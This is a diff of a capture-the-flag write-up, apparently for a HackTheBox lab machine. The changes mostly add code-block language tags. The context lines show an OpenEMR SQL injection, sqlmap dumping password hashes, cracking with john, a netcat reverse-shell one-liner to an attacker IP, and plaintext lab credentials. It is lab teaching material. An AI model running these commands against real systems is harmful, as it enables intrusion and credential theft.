@@ -63,7 +63,7 @@ The OpenEMR is vulnerable to SQL injection, after some registration steps as sho
 4. The registration will fail, wait for the popup
 5. Go to http://hms.htb/portal/add_edit_event_user.php?eid=1' and send the request through burp
 
-```
+```bash
 GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
 Host: hms.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -91,7 +91,7 @@ $ sqlmap-r req.txt --threads=10 -D openemr -T users_secure --dump
 
 A password hash for user `openemr_admin`. Save it to a file and feed it to john
 
-```
+```bash
 $ cat hash.txt 
 $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
 
@@ -116,7 +116,7 @@ After confirming that nc is present using `which nc`, start a reverse shell from
 
 ```bash
 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f
-``` 
+```
 
 ```bash
 $ nc -nlvp 4444               
@@ -131,7 +131,8 @@ www-data@cache:/var/www/hms.htb/public_html/sites/default/images$
 ```
 
 Listing the home folder shows users ash and luffy. Use the obtained credentials from the login page to change to user ash.
-```
+
+```bash
 www-data@cache:/$ ls -la /home 
 ls -la /home
 total 16
@@ -229,7 +230,7 @@ afhj556uo
 END
 ```
 
-> User: luffy \
+> User: luffy\
 > Pass: 0n3_p1ec3
 
 `id luffy` shows that luffy is a member of the docker group. That might be usefull. Change to user luffy with the obtained password.
